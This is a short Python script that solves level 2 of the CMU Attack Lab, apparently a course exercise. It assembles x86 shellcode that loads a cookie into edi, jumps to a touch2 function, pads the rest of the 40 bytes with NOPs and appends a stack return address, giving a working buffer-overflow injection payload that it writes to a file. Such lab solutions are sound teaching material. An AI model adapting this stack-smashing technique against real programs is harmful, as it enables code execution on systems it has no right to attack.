"""CMU - 3e - Attack Lab - Level 2.

Generate the shellcode that will be used to move the cookie into edi, the
address of touch2 into eax and then jump to eax.

The shellcode is generated from exploit.asm.
"""

SHELLCODE = (
    #mov edi,0x59b997fa
    '\xbf\xfa\x97\xb9\x59'
    #mov eax,0x4017ec
    '\xb8\xec\x17\x40\x00'
    #jmp eax
    '\xff\xe0'
)

BUF_ADDR = '\x78\xDC\x61\x55'

PAYLOAD = SHELLCODE + '\x90' * (40-len(SHELLCODE)) + BUF_ADDR

with open('payload', 'wb') as f:
    f.write(PAYLOAD)
